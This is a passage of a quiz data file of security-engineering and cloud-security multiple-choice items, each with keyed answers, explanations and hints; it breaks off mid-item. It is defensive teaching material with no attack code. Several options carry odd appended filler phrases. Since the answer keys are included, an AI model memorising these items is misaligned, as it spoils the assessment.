    id: 951, rank: 4, role: "security-engineering", topic: "TLS 0-RTT Replay", difficulty: "EXPERT",
    q: "A payments API enables TLS 1.3 0-RTT early data for speed. What is the BEST design response?",
    options: ["Rely on the client to avoid sending the same request twice, until the next scheduled review takes place","Allow early data only for idempotent requests and enforce replay protection on the server","Allow early data for all requests as TLS protects the connection","Disable TLS 1.3 entirely, and return to TLS 1.2"],
    correct: 1, why: "Allowing everything is the runner-up since TLS encrypts the data, but early data can be replayed, so only safe operations should use it.",
    hint: "Replay is the risk."
  },
  {
    id: 952, rank: 4, role: "security-engineering", topic: "Workload Attestation", difficulty: "EXPERT",
    q: "Which design best proves to a secrets service that a workload is the genuine one it claims to be?",
    options: ["A shared token written into the deployment file that every replica reads, as a general rule","Platform attestation of workload identity against signed measurements, in most cases","The host name of the workload, which is set when the instance is created","The IP address of the workload, which the network team keeps in an inventory, in most cases"],
    correct: 1, why: "Attestation ties identity to verifiable runtime properties rather than to guessable attributes.",
    hint: "Attest, do not assert."
  },
  {
    id: 953, rank: 4, role: "security-engineering", topic: "Reproducible Builds", difficulty: "EXPERT",
    q: "What assurance do reproducible builds provide?",
    options: ["Dependencies are never needed as every library is compiled into the binary","Builds always run faster as the compiler cache is shared between all of the teams","The source code is hidden from the customers who receive the compiled product","Independent parties can rebuild the same bytes and spot tampering"],
    correct: 3, why: "Matching outputs from independent builds expose compromised build systems.",
    hint: "Same bytes."
  },
  {
    id: 954, rank: 4, role: "security-engineering", topic: "Key Ceremony Design", difficulty: "EXPERT",
    q: "Which design best protects the root key of a signing authority?",
    options: ["HSM generation with split knowledge, dual control and a witnessed log, in most cases","One engineer holding the whole key for convenience while the team is small","Generation on an admin laptop with a copy kept in cloud storage for recovery, as a general rule","An emailed backup of the key sent to the team mailing list for safekeeping, as a general rule"],
    correct: 0, why: "Dual control and split knowledge prevent one person from misusing or losing the root.",
    hint: "Dual control."
  },
  {
    id: 955, rank: 4, role: "security-engineering", topic: "Post-Quantum Migration", difficulty: "EXPERT",
    q: "What is the BEST first step for an organisation planning to move to post-quantum cryptography?",
    options: ["Inventory where cryptography is used and rank data by secrecy lifetime","Wait until quantum computers are working, and then begin to plan a migration","Move all data to removable media, and keep it in a locked safe","Double all key sizes"],
    correct: 0, why: "Doubling key sizes is the runner-up since it is quick, but it does not address the algorithms that quantum computers break; an inventory shows what to migrate first.",
    hint: "Know what you have."
  },
  {
    id: 956, rank: 4, role: "security-engineering", topic: "Spectre-Class Mitigation", difficulty: "EXPERT",
    q: "Which approach best addresses speculative-execution side channels for sensitive workloads in a shared cloud?",
    options: ["Ignore the issue as the attacks are theoretical, and need very precise timing","Lengthen the passwords of every user who has access to the shared cloud hosts","Isolate sensitive workloads on dedicated hosts and apply mitigations","Disable all logging on the shared hosts, and attackers cannot read the events"],
    correct: 2, why: "Isolation and mitigations reduce cross-tenant leakage risk.",
    hint: "Isolate sensitive work."
  },
  {
    id: 957, rank: 4, role: "security-engineering", topic: "Transparency Logs", difficulty: "EXPERT",
    q: "How do certificate transparency logs help defenders?",
    options: ["They publicly record issued certificates so mis-issuance is seen","They encrypt the certificates that the authority issues to the customers who ask","They speed up the handshake between the browser, and the server on each visit","They store the private keys for the certificates, and they can be recovered"],
    correct: 0, why: "Monitoring logs reveals unexpected certificates for your domains.",
    hint: "Public record."
  },
  {
    id: 958, rank: 4, role: "security-engineering", topic: "Memory Tagging", difficulty: "EXPERT",
    q: "What does hardware memory tagging mainly help detect?",
    options: ["Network congestion on the links between the data centres during peak hours, as a general rule","Use-after-free, and out-of-bounds memory errors, until the next scheduled review takes place","Weak passwords chosen by the users of the application during their registration","Phishing emails that reach the mailboxes of staff in the finance department, and revisit the decision after the next release"],
    correct: 1, why: "Tags catch mismatched pointer and memory access patterns at runtime.",
    hint: "Memory errors."
  },
  {
    id: 959, rank: 4, role: "security-engineering", topic: "Seccomp Profile", difficulty: "EXPERT",
    exhibit: "{\"defaultAction\":\"SCMP_ACT_ERRNO\",\"syscalls\":[{\"names\":[\"read\",\"write\",\"exit\",\"futex\"],\"action\":\"SCMP_ACT_ALLOW\"}]}",
    q: "What does a seccomp profile do for a containerised service?",
    options: ["Controls the colour of the terminal output that the process writes to the console","Encrypts all of the network traffic that the process sends to the internet","Limits the amount of disk space that the process may use for temporary files","Restricts the system calls the process may make"],
    correct: 3, why: "Fewer permitted system calls reduce kernel attack surface.",
    hint: "Limit syscalls."
  },
  {
    id: 960, rank: 4, role: "security-engineering", topic: "Secure Boot Chain", difficulty: "EXPERT",
    q: "Which feature helps ensure only trusted firmware and boot components start on a server?",
    options: ["A new keyboard that is locked in a cabinet next to the server in the rack","A bigger system disk that has enough room for the operating system updates","A long BIOS password that the administrators write down in the server room log","Measured and verified boot anchored in a hardware root of trust"],
    correct: 3, why: "Each stage is verified or measured so tampering is detected.",
    hint: "Chain of trust."
  },
  {
    id: 961, rank: 4, role: "security-engineering", topic: "Prompt Injection Architecture", difficulty: "EXPERT",
    q: "An LLM assistant reads untrusted web pages and can call internal tools. What is the BEST architecture?",
    options: ["Remove all of the logging, and attackers cannot see how the model responds","Tell the model in the prompt to ignore malicious instructions","Treat model output as untrusted and gate sensitive tool actions","Give the model full access to all of the tools, and it can work better"],
    correct: 2, why: "A prompt warning is the runner-up since it is easy, but injected text can override it; enforcement must be outside the model.",
    hint: "Enforce outside the model."
  },
  {
    id: 962, rank: 4, role: "security-engineering", topic: "Agent Tool Sandbox", difficulty: "EXPERT",
    q: "An AI agent executes code from untrusted sources. Which control is most important?",
    options: ["Allowing unrestricted internet access","An isolated sandbox with no secrets, restricted network and resource limits","Running it on the developer laptop","Giving it the production credentials"],
    correct: 1, why: "Sandboxing limits what a manipulated agent can reach.",
    hint: "Isolate execution."
  },
  {
    id: 963, rank: 4, role: "security-engineering", topic: "Model Supply Chain", difficulty: "EXPERT",
    q: "Which practice best reduces risk from downloaded machine learning models?",
    options: ["Disable the hash checks as they slow down the loading of large models","Use trusted sources, verify signatures and avoid unsafe formats, as a first step","Run models directly from any website that offers the weights without any checks","Share the models between teams by email attachments, and nobody downloads twice, as soon as practical"],
    correct: 1, why: "Models can contain executable payloads, so provenance and safe formats matter.",
    hint: "Verify and use safe formats."
  },
  {
    id: 964, rank: 4, role: "security-engineering", topic: "Vector Store Authorisation", difficulty: "EXPERT",
    q: "A retrieval system indexes documents from many departments. What design prevents users seeing content they should not?",
    options: ["Index everything, and trust the model not to reveal documents that users may not read","Let every user query every index, and rely on the audit trail to find misuse, in the first instance","Enforce source permissions at retrieval with per-user filtering, as soon as practical","Remove the permissions at ingestion, and all documents are treated the same"],
    correct: 2, why: "Access control must be applied before content reaches the model.",
    hint: "Permissions at retrieval."
  },
  {
    id: 965, rank: 4, role: "security-engineering", topic: "Forward-Secure Logging", difficulty: "EXPERT",
    q: "What property does forward-secure logging provide?",
    options: ["Logs need no storage as they are streamed to analysts, and then discarded","Past entries cannot be silently altered after a later compromise","Logs are shorter as older records are summarised at the end of each day","Logs are public, and anyone can verify that the company has recorded events"],
    correct: 1, why: "Evolving keys prevent forging earlier records.",
    hint: "Past entries protected."
  },
  {
    id: 966, rank: 4, role: "security-engineering", topic: "SLSA Levels", difficulty: "EXPERT",
    q: "What does a higher SLSA build level generally add?",
    options: ["Faster compilation as higher levels allow more parallel build machines to be used","Smaller binaries as the build removes all of the unused debugging symbols, as a general rule","More dependencies in the product as the framework asks for extra libraries, in most cases","Stronger guarantees about source, build integrity and provenance, as a general rule"],
    correct: 3, why: "Higher levels require hardened, auditable builds.",
    hint: "Provenance."
  },
  {
    id: 967, rank: 4, role: "security-engineering", topic: "DPoP Tokens", difficulty: "EXPERT",
    exhibit: "Authorization: DPoP eyJhbGciOiJSUzI1NiJ9...\nDPoP: eyJ0eXAiOiJkcG9wK2p3dCIsImFsZyI6IkVTMjU2Ii...",
    q: "What problem does sender-constrained token binding such as DPoP address?",
    options: ["Weak passwords chosen by users who register for the first time on the website","Slow logins caused by the identity provider having to check many password rules","Stolen access tokens replayed by another party","Email spoofing against the domain of the company by attackers outside the network"],
    correct: 2, why: "The token is bound to a key held by the client.",
    hint: "Bind the token."
  },
  {
    id: 968, rank: 4, role: "security-engineering", topic: "Offline Key Ceremony", difficulty: "EXPERT",
    q: "Why is a root key generated in a formal key ceremony?",
    options: ["It removes the need for any backups of the key","It makes every signature shorter than before in practice","It avoids audits","Witnessed steps prove the key was created safely"],
    correct: 3, why: "A witnessed, documented ceremony gives assurance that the key was never exposed.",
    hint: "Witnessed and scripted."
  },
  {
    id: 969, rank: 4, role: "security-engineering", topic: "BMC Firmware Risk", difficulty: "EXPERT",
    q: "Why are server baseboard management controllers an important security concern?",
    options: ["They store the backups of the operating system for the server that hosts them","They have no network access, and can only be reached by a person at the server","They only control the fans, and the temperature sensors inside the server chassis","They give powerful out-of-band control and run their own firmware"],
    correct: 3, why: "Compromised BMCs persist below the operating system.",
    hint: "Out-of-band control."
  },
  {
    id: 970, rank: 4, role: "security-engineering", topic: "Compiler Hardening", difficulty: "EXPERT",
    q: "Which build option best mitigates control-flow hijacking in native code?",
    options: ["Removing the comments from the source code before the compiler is started","Control-flow integrity with stack protections, and ASLR, as a general rule","Using longer variable names, and the code is easier to read in reviews","Disabling optimisation, and the compiler produces the same output each time"],
    correct: 1, why: "Layered exploit mitigations raise the cost of memory corruption attacks.",
    hint: "Mitigate hijacking."
  },
  {
    id: 971, rank: 4, role: "security-engineering", topic: "Formal Verification Scope", difficulty: "EXPERT",
    q: "What is a sensible use of formal verification in security engineering?",
    options: ["Verifying every line of code in a large application with many developers, as soon as practical","Proving that the business is secure to the satisfaction of the regulators","Proving properties of small critical parts such as protocol cores, as a general rule","Replacing all of the testing that would otherwise be done before a release"],
    correct: 2, why: "It is costly, so it is used where the highest assurance matters.",
    hint: "Small and critical."
  },
  {
    id: 972, rank: 4, role: "security-engineering", topic: "Defensive Fuzzing", difficulty: "EXPERT",
    q: "A library parses untrusted files. What is the BEST way to improve assurance over time?",
    options: ["Continuous coverage-guided fuzzing with sanitisers and a corpus","Disabling verbose errors, and crashes are never shown to the callers","One manual test per year","A code comment saying input is validated"],
    correct: 0, why: "A yearly manual test is the runner-up as it adds human insight, but parsers change with each commit and need repeatable coverage.",
    hint: "Continuous fuzzing."
  },
  {
    id: 973, rank: 4, role: "security-engineering", topic: "Cloud Hypervisor Risk", difficulty: "EXPERT",
    q: "Which architecture best limits the impact of a rare hypervisor escape?",
    options: ["Separate sensitive workloads by account, host pool and key domain","Disable monitoring","Run all workloads together, and revisit the decision after the next release","Use one account, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Blast radius reduction assumes isolation can fail.",
    hint: "Assume breach."
  },
  {
    id: 974, rank: 4, role: "security-engineering", topic: "Incident-Driven Redesign", difficulty: "EXPERT",
    q: "After a breach, which engineering response is most valuable?",
    options: ["Rename the system, and the attackers cannot recognise it the next time","Fix the class of weakness through a design change","Patch the single bug that was used in the attack and consider the matter closed","Blame the developer who wrote the code, and arrange extra training for them"],
    correct: 1, why: "Eliminating the underlying class reduces repeat incidents.",
    hint: "Fix the class."
  },
  {
    id: 975, rank: 4, role: "security-engineering", topic: "Zero Trust for Workloads", difficulty: "EXPERT",
    q: "What does zero trust for workloads mean in practice?",
    options: ["Using one large firewall around the data centre to separate the inside, and outside","Trusting calls that originate from inside the network as they passed the firewall","Every call is authenticated using workload identity, wherever it comes from","Disabling identity checks between services to avoid delays in the request path"],
    correct: 2, why: "Network position is not enough to trust a request.",
    hint: "Authenticate every call."
  },
  {
    id: 976, rank: 4, role: "security-engineering", topic: "mTLS Rotation Failure", difficulty: "EXPERT",
    q: "Certificates for service-to-service mTLS expire silently and cause outages. What is the BEST engineering fix?",
    options: ["Automate issuance and rotation, with short lifetimes and expiry alerts","Rotate the certificates by hand every quarter using a checklist kept in the wiki","Extend lifetimes to ten years","Disable mTLS for the services that failed, and they can talk again at once"],
    correct: 0, why: "Long lifetimes are the runner-up since they avoid expiry, but they increase exposure; automation solves both.",
    hint: "Automate rotation."
  },
  {
    id: 977, rank: 4, role: "security-engineering", topic: "OSS Maintainer Takeover", difficulty: "EXPERT",
    q: "Which control best reduces risk if an open-source maintainer account is hijacked?",
    options: ["Always take the latest version automatically and fixes arrive without delay","Disable the dependency scanning as it generates too many warnings for teams, and review the outcome at the next monthly meeting","Pin versions and hashes, review updates and delay critical packages, and revisit the decision after the next release","Trust the registry as it checks the identity of every maintainer for us"],
    correct: 2, why: "Controlled updating limits exposure to malicious releases.",
    hint: "Pin and review."
  },
  {
    id: 978, rank: 4, role: "security-engineering", topic: "Library Hijacking Mitigation", difficulty: "EXPERT",
    q: "Which practice best prevents loading a malicious library from an unexpected path?",
    options: ["Allow writable library directories, and the users can install their own tools","Use relative paths","Add more libraries to the search path, and the program can always find them","Absolute trusted paths, signed binaries and restricted search paths"],
    correct: 3, why: "Controlled loading removes hijack opportunities.",
    hint: "Control the path."
  },
  {
    id: 979, rank: 4, role: "security-engineering", topic: "Differential Privacy", difficulty: "EXPERT",
    q: "What does differential privacy aim to protect?",
    options: ["Software licences","Passwords","Individuals' data by adding calibrated noise to published statistics","Network traffic"],
    correct: 2, why: "It limits what can be inferred about any one person.",
    hint: "Noise for privacy."
  },
  {
    id: 980, rank: 4, role: "security-engineering", topic: "Homomorphic Encryption Trade-off", difficulty: "EXPERT",
    q: "What is the main practical limitation of fully homomorphic encryption today?",
    options: ["It is illegal","High computational cost and latency","It cannot encrypt","It has no keys"],
    correct: 1, why: "Computation on encrypted data is currently expensive for many workloads.",
    hint: "Performance cost."
  },
  {
    id: 981, rank: 4, role: "security-engineering", topic: "Chaos for Security", difficulty: "EXPERT",
    q: "What is the aim of security chaos engineering?",
    options: ["Causing outages for fun","Removing monitoring","Avoiding change","Testing that controls and responses work when components fail or are attacked"],
    correct: 3, why: "Controlled experiments reveal hidden assumptions.",
    hint: "Experiment safely."
  },
  {
    id: 982, rank: 4, role: "security-engineering", topic: "Detection From Engineering", difficulty: "EXPERT",
    q: "How should engineers contribute to detection of attacks on their own services?",
    options: ["Hide logs","Delay the alerts until the end of the sprint and the team is not interrupted","Disable authentication events as they produce a large volume of log lines","Emit security events and document abuse cases for detection teams"],
    correct: 3, why: "Application-level signals enable high-fidelity detection.",
    hint: "Emit signals."
  },
  {
    id: 983, rank: 4, role: "security-engineering", topic: "Secret Leak Response Automation", difficulty: "EXPERT",
    q: "A secret is detected in a public repository. Which automated response is best?",
    options: ["Revoke and rotate the credential automatically and open a ticket with the owner","Delete the commit only","Wait a week, as a general rule","Email the team"],
    correct: 0, why: "Fast revocation limits misuse.",
    hint: "Revoke fast."
  },
  {
    id: 984, rank: 4, role: "security-engineering", topic: "Hardware Token Lifecycle", difficulty: "EXPERT",
    q: "What should a FIDO2 deployment plan for beyond issuing keys?",
    options: ["Nothing","Enrolment, loss and recovery, and revocation processes as strong as the keys themselves","Recovery by email only","Shared tokens"],
    correct: 1, why: "Weak recovery undermines strong authentication.",
    hint: "Strong recovery."
  },
  {
    id: 985, rank: 4, role: "security-engineering", topic: "Edge Compute Security", difficulty: "EXPERT",
    q: "A company runs code on third-party edge nodes. Which assumption should the design make?",
    options: ["Nodes can be physically accessed or tampered with, so minimise secrets and verify integrity","Nodes never fail","Nodes are always private","Nodes are fully trusted"],
    correct: 0, why: "Untrusted locations need protective design.",
    hint: "Minimise secrets."
  },
  {
    id: 986, rank: 4, role: "security-engineering", topic: "Secure Multiparty Computation", difficulty: "EXPERT",
    q: "When might secure multiparty computation be appropriate?",
    options: ["When storing backups","When printing","When sending email","When parties must compute a joint result without revealing their inputs to each other"],
    correct: 3, why: "It enables collaboration without data sharing.",
    hint: "Joint compute."
  },
  {
    id: 987, rank: 4, role: "security-engineering", topic: "Software Update Trust", difficulty: "EXPERT",
    q: "Which design best protects a software update channel against compromise of the update server?",
    options: ["One online signing key","Unsigned updates over HTTPS","Offline signing keys, threshold trust and client-side verification with rollback protection","Updates by email"],
    correct: 2, why: "Separating signing from distribution limits the effect of server compromise.",
    hint: "Sign offline."
  },
  {
    id: 988, rank: 4, role: "security-engineering", topic: "Security Debt Management", difficulty: "EXPERT",
    q: "How should long-lived security design debt be handled?",
    options: ["Record it with owners, risk and a funded remediation plan visible to leadership","Wait for an audit","Hide it","Ignore it"],
    correct: 0, why: "Visible decisions prevent silent accumulation.",
    hint: "Make it visible."
  },
  {
    id: 989, rank: 4, role: "security-engineering", topic: "Signing Pipeline Compromise", difficulty: "EXPERT",
    q: "Developers can sign releases from their own laptops using a copied key. What is the best control?",
    options: ["Back it up to a shared mailbox","Encrypt it with a shared password that the team knows, and review the outcome at the next monthly meeting","Move it to a different folder on each of the laptops, and revisit the decision after the next release","Centralise signing in a service that logs and approves each request"],
    correct: 3, why: "A stolen signing key lets attackers distribute trusted malware, so key use must be controlled and audited.",
    hint: "Control signing requests."
  },
  {
    id: 990, rank: 4, role: "security-engineering", topic: "Metrics for Engineering Security", difficulty: "EXPERT",
    exhibit: "Service baseline compliance\nTeam A 92%  | median critical fix 4 days\nTeam B 61%  | median critical fix 29 days\nTeam C 78%  | median critical fix 11 days",
    q: "Which measure best shows that engineering teams are building security in?",
    options: ["The number of security slides presented","The share of services meeting a secure baseline and the time to fix critical findings","The number of scans run","The number of meetings held"],
    correct: 1, why: "Outcome measures show the real state of the estate.",
    hint: "Baseline and fix time."
  },
  {
    id: 991, rank: 4, role: "security-engineering", topic: "Crypto Inventory Exhibit", difficulty: "EXPERT",
    exhibit: "System       Use          Algorithm        Key size\nlegacy-docs  signing      RSA+SHA-1        1024\nweb-gw       TLS          ECDHE+AES-GCM    256\ndb-main      encryption   AES-256-GCM      256\nvpn          tunnel       IKEv2 AES-GCM    256",
    q: "Which finding in this cryptography inventory is the highest priority to replace?",
    options: ["A VPN using current recommended algorithms","A service using modern TLS with forward secrecy","A legacy system signing documents with SHA-1 and 1024-bit keys","A database using AES-256 with managed keys"],
    correct: 2, why: "Weak signing algorithms undermine trust in signed data.",
    hint: "Weak algorithm."
  },
  {
    id: 992, rank: 4, role: "security-engineering", topic: "Architecture Trade-off Analysis", difficulty: "EXPERT",
    q: "A team must choose between strong isolation and low latency for a payment path. What is the BEST approach?",
    options: ["Choose isolation and optimise performance within the secure design","Remove isolation to meet the speed target, and review the outcome at the next monthly meeting","Skip the review, and decide later","Duplicate the payment data in the public tier"],
    correct: 0, why: "Removing isolation is the runner-up as it meets the target, but it exposes the most sensitive path.",
    hint: "Protect sensitive path."
  },
  {
    id: 993, rank: 4, role: "security-engineering", topic: "Attack Surface Reduction", difficulty: "EXPERT",
    q: "Which measure most reduces attack surface for a service?",
    options: ["Remove unused features endpoints and ports","Increase the number of exposed admin interfaces","Keep every legacy module for compatibility","Add more public documentation"],
    correct: 0, why: "Fewer exposed components mean fewer ways in.",
    hint: "Remove what is unused."
  },
  {
    id: 994, rank: 4, role: "security-engineering", topic: "Supply Chain Provenance", difficulty: "EXPERT",
    q: "What does build provenance provide?",
    options: ["Evidence of how and where software was built","A guarantee that software has no bugs","The price of each component","A list of customer names"],
    correct: 0, why: "Provenance supports integrity checks.",
    hint: "How it was built."
  },
  {
    id: 995, rank: 4, role: "security-engineering", topic: "Disaster Recovery Design", difficulty: "EXPERT",
    q: "Which design best meets a four-hour recovery objective?",
    options: ["No standby and manual rebuild from memory, as a general rule","Weekly tape backups stored in the same building","A single data centre with good insurance, in most cases","Warm standby in another site with tested failover"],
    correct: 3, why: "The objective requires prepared and tested capacity.",
    hint: "Tested standby."
  },
  {
    id: 996, rank: 4, role: "security-engineering", topic: "Tokenisation Architecture", difficulty: "EXPERT",
    q: "Why tokenise payment card numbers?",
    options: ["It reduces where real card data is stored and exposed","It makes the payment cards expire sooner, and old numbers are no longer useful","It speeds up the work at the cashier desk by shortening the card number on the receipt","It removes the need for any security controls on the systems that handle payments"],
    correct: 0, why: "Tokens limit sensitive data scope.",
    hint: "Reduce scope."
  },
  {
    id: 997, rank: 4, role: "security-engineering", topic: "Edge to Core Trust Exhibit", difficulty: "EXPERT",
    exhibit: "Edge gateways: 4,200 devices\nAuthentication to core: pre-shared key 'plantkey2019' (same on all)\nCertificate rotation: none\nCore API scope: full read/write",
    q: "What weakness does this trust configuration show?",
    options: ["Connections are logged, and monitored by the security team at all of the sites","Each edge device has its own unique certificate that is rotated on a regular schedule","Access is limited by the device identity, and its role in the plant network design","Edge devices can authenticate to the core with a shared secret"],
    correct: 3, why: "A shared secret means one stolen device compromises all.",
    hint: "Unique identity."
  },
  {
    id: 998, rank: 4, role: "security-engineering", topic: "Hybrid Cloud Security Design", difficulty: "EXPERT",
    q: "What is a key principle for hybrid cloud security design?",
    options: ["Separate unrelated controls in each environment, and review the outcome at the next monthly meeting","Consistent identity policy and monitoring across environments","Allow direct internet access to on-premises systems","Use different logging formats everywhere"],
    correct: 1, why: "Consistency avoids gaps between environments.",
    hint: "Consistent policy."
  },
  {
    id: 999, rank: 4, role: "security-engineering", topic: "Safe Failure Design", difficulty: "EXPERT",
    q: "What does fail-safe mean for a security control?",
    options: ["On failure it deletes logs","On failure it allows all traffic, as a general rule","On failure it defaults to a secure state","On failure it turns off alerts"],
    correct: 2, why: "Secure failure avoids opening access when components break.",
    hint: "Secure default."
  },
  {
    id: 1000, rank: 4, role: "security-engineering", topic: "Paved Road Adoption", difficulty: "EXPERT",
    q: "How can a platform team encourage teams to use secure defaults?",
    options: ["Hide the platform documentation, and revisit the decision after the next release","Punish teams that choose other tools","Make the secure path faster and better supported than the alternatives","Block teams until they ask permission by email, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Adoption follows convenience and support.",
    hint: "Easy and supported."
  },
  {
    id: 1001, rank: 0, role: "cloud-security", topic: "Shared Responsibility Model", difficulty: "BEGINNER",
    q: "In the cloud shared responsibility model, who is responsible for the security of customer data stored in a service?",
    options: ["The customer","The internet service provider, as it carries the data","The cloud provider alone, as it owns the hardware","Nobody, as the data is stored in a shared service"],
    correct: 0, why: "Providers secure the infrastructure, but customers remain responsible for their data, access and configuration.",
    hint: "Your data, your duty."
  },
  {
    id: 1002, rank: 0, role: "cloud-security", topic: "IaaS Patching Duty", difficulty: "BEGINNER",
    q: "For a virtual machine in an infrastructure-as-a-service model, who normally patches the guest operating system?",
    options: ["The customer who runs the machine, as a general rule","The internet service provider that supplies the connection","The cloud provider's data centre staff on a monthly schedule","The hardware manufacturer through firmware updates"],
    correct: 0, why: "In IaaS the customer manages the operating system and everything above it.",
    hint: "Customer owns the OS."
  },
  {
    id: 1003, rank: 0, role: "cloud-security", topic: "Root Account Protection", difficulty: "BEGINNER",
    q: "What is the best way to protect a cloud account's root user?",
    options: ["Write the password in the team chat, and it is not lost","Enable MFA, avoid daily use and keep the credentials secured","Share the password with all of the administrators in the team","Use the root account for everyday tasks to save time"],
    correct: 1, why: "The root user has unrestricted power, so it needs strong protection and limited use.",
    hint: "Lock it away."
  },
  {
    id: 1004, rank: 0, role: "cloud-security", topic: "Public Storage Finding", difficulty: "BEGINNER",
    exhibit: "Bucket: customer-invoices-2025\nPublic access block: OFF\nACL: AllUsers READ\nVersioning: Enabled\nEncryption: SSE-S3",
    q: "Which finding in this storage bucket configuration is the most serious?",
    options: ["Public read access for everyone","Server-side encryption is enabled with a key that the provider manages","Versioning is enabled for the bucket, and older copies of files are kept","The bucket has a descriptive name that shows the year of the invoices"],
    correct: 0, why: "Public read access can expose all stored objects to anyone.",
    hint: "Check the access line."
  },
  {
    id: 1005, rank: 0, role: "cloud-security", topic: "Security Group Rule", difficulty: "BEGINNER",
    exhibit: "Inbound rule\nProtocol: TCP\nPort: 22\nSource: 0.0.0.0/0\nDescription: admin access",
    q: "What does this security group rule allow?",
    options: ["Outbound traffic to the database only, as a general rule","Nothing, as the rule is disabled","Only the company office to reach the web port, as a general rule","Anyone on the internet to connect to SSH on the server"],
    correct: 3, why: "Source 0.0.0.0/0 on port 22 exposes SSH to the whole internet.",
    hint: "Read the source and port."
  },
  {
    id: 1006, rank: 0, role: "cloud-security", topic: "Least Privilege in IAM", difficulty: "BEGINNER",
    q: "A developer only needs to read objects from one storage bucket. Which permission is best?",
    options: ["Administrator access to the whole account","Full access to all storage in the account","Permission to delete any resource in the account, as a general rule","Read-only access to that bucket, in most cases"],
    correct: 3, why: "Granting only what is needed limits damage from mistakes and stolen credentials.",
    hint: "Smallest permission."
  },
  {
    id: 1007, rank: 0, role: "cloud-security", topic: "Access Key Exposure", difficulty: "BEGINNER",
    q: "A developer posts a cloud access key in a public code repository. What is the BEST first action?",
    options: ["Ask the developer to be more careful in future, and revisit the decision after the next release","Change the name of the repository","Delete the post, and keep using the same key","Disable and rotate the key and review its recent activity"],
    correct: 3, why: "Deleting the post is the runner-up since it stops further exposure, but the key may already be copied, so revoke it first.",
    hint: "Revoke the key."
  },
  {
    id: 1008, rank: 0, role: "cloud-security", topic: "Encryption in the Cloud", difficulty: "BEGINNER",
    q: "What does encrypting a cloud storage volume protect against?",
    options: ["All phishing emails sent to the users of the system, in most cases","Reading the data if the underlying storage is accessed without the key","Slow network speed between the regions of the provider, as a general rule","Weak passwords chosen by the administrators of the account"],
    correct: 1, why: "Encryption at rest makes stored data unreadable without the key.",
    hint: "Data at rest."
  },
  {
    id: 1009, rank: 0, role: "cloud-security", topic: "Audit Logging", difficulty: "BEGINNER",
    q: "Why should audit logging of cloud account activity be enabled?",
    options: ["To make the cloud services run faster for the users","To remove the need for any permissions in the account","To reduce the monthly bill that is paid to the cloud provider","To record who did what so that misuse can be investigated"],
    correct: 3, why: "Management-plane logs show changes and access, which is essential for detection and forensics.",
    hint: "Who did what."
  },
  {
    id: 1010, rank: 0, role: "cloud-security", topic: "Unexpected Cloud Bill", difficulty: "BEGINNER",
    q: "A cloud bill suddenly rises and many large compute instances appear in an unused region. What is the most likely cause?",
    options: ["A new employee reading a help document in the console on the first day, as a general rule","A change to the logo and the colour theme of the management console, in most cases","Stolen credentials used to mine cryptocurrency","A scheduled backup that has been delayed, and now runs for much longer"],
    correct: 2, why: "Attackers often launch compute in unused regions to mine cryptocurrency at the victim's cost.",
    hint: "Unused region, big bill."
  },
  {
    id: 1011, rank: 0, role: "cloud-security", topic: "Multi-Factor for Console", difficulty: "BEGINNER",
    q: "Which action best reduces the risk of cloud console account takeover?",
    options: ["Disabling the audit logs for administrators, as soon as practical","Requiring longer usernames for the users of the account","Hiding the console address from the staff","Requiring MFA for all users, as a general rule"],
    correct: 3, why: "MFA protects accounts even when passwords are stolen.",
    hint: "Second factor."
  },
  {
    id: 1012, rank: 0, role: "cloud-security", topic: "Region Choice and Privacy", difficulty: "BEGINNER",
    q: "Why might a company choose to keep customer data in a specific region?",
    options: ["To avoid having to use any encryption","To make the data harder for the customer to read","To meet data residency and privacy requirements","To increase the cost of the service on purpose"],
    correct: 2, why: "Laws and contracts may require data to stay in certain countries.",
    hint: "Residency rules."
  },
  {
    id: 1013, rank: 0, role: "cloud-security", topic: "Snapshot Sharing", difficulty: "BEGINNER",
    q: "A team shares a disk snapshot with another account for testing. What is the BEST way to do it?",
    options: ["Share it with that account only, and remove sharing later","Leave it shared with everyone permanently in case other teams need it later","Make the snapshot public, and anyone can copy it","Email the snapshot to the tester as an attachment, and they can open it"],
    correct: 0, why: "Making it public is the runner-up since it is quick, but anyone can copy the data inside it.",
    hint: "Specific account only."
  },
  {
    id: 1014, rank: 0, role: "cloud-security", topic: "SaaS Responsibility", difficulty: "BEGINNER",
    q: "A company uses a SaaS email service. Which task remains the customer's responsibility?",
    options: ["Managing user accounts, MFA and access settings","Patching the provider's data centre servers, as soon as practical","Replacing failed disks in the provider's racks","Maintaining the provider's network routers, in the first instance"],
    correct: 0, why: "Even in SaaS, customers control identities, configuration and data sharing.",
    hint: "Accounts and settings."
  },
  {
    id: 1015, rank: 0, role: "cloud-security", topic: "Private Subnet Purpose", difficulty: "BEGINNER",
    q: "What is a private subnet used for in a cloud network?",
    options: ["Storing public web pages for all visitors","Sending email to customers","Hosting resources that should not be directly reachable from the internet","Running the provider's billing system"],
    correct: 2, why: "Private subnets keep back-end systems away from direct internet access.",
    hint: "Not directly reachable."
  },
  {
    id: 1016, rank: 0, role: "cloud-security", topic: "Cloud Backup Basics", difficulty: "BEGINNER",
    q: "Which practice best protects cloud data from accidental deletion or ransomware?",
    options: ["One copy in the same account with full delete rights for everyone, as a general rule","No backups, as the cloud provider is always reliable and never loses any data","Backups that nobody has ever tried to restore as the first set was made","Versioned backups, restricted delete rights and tested restores, as a general rule"],
    correct: 3, why: "Protected and tested backups let you recover from deletion or malicious change.",
    hint: "Protect and test."
  },
  {
    id: 1017, rank: 0, role: "cloud-security", topic: "Cloud Posture Tool", difficulty: "BEGINNER",
    q: "What does a cloud security posture management tool mainly do?",
    options: ["Pays the monthly invoice for the cloud account on behalf of the finance team","Replaces all of the staff who work in the security team of the organisation","Checks cloud settings against best practice, and flags risks, in most cases","Writes the application code for the developers who work on the cloud projects"],
    correct: 2, why: "CSPM finds misconfigurations such as open storage or weak rules.",
    hint: "Finds misconfigurations."
  },
  {
    id: 1018, rank: 0, role: "cloud-security", topic: "Serverless Responsibility", difficulty: "BEGINNER",
    q: "In a serverless function service, which item is the customer still responsible for?",
    options: ["The security of their function code and permissions, as a general rule","The cabling between the racks of servers that the provider operates","The firmware of the physical servers that run the functions in the data centre","The cooling of the data centre in which the function platform is hosted"],
    correct: 0, why: "Providers run the infrastructure, but code and permissions remain with the customer.",
    hint: "Your code, your permissions."
  },
  {
    id: 1019, rank: 0, role: "cloud-security", topic: "Role Instead of Keys", difficulty: "BEGINNER",
    q: "An application running in the cloud needs to access storage. What is the BEST way to give it access?",
